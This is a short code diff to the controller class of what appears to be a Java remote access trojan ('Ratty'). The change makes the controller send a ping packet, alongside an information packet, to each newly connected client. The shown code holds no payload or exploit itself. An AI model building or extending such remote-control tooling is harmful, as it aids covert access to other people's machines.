@@ -6,6 +6,7 @@ import de.sogomn.rat.ActiveConnection;
 import de.sogomn.rat.IConnectionObserver;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.InformationPacket;
+import de.sogomn.rat.packet.PingPacket;
 
 public abstract class AbstractRattyController implements IServerObserver, IConnectionObserver {
 	
@@ -18,10 +19,12 @@ public abstract class AbstractRattyController implements IServerObserver, IConne
 	@Override
 	public void connected(final ActiveServer server, final ActiveConnection connection) {
 		final InformationPacket packet = new InformationPacket();
+		final PingPacket ping = new PingPacket();
 		
 		connection.setObserver(this);
 		connection.start();
 		connection.addPacket(packet);
+		connection.addPacket(ping);
 		connections.add(connection);
 	}
 	
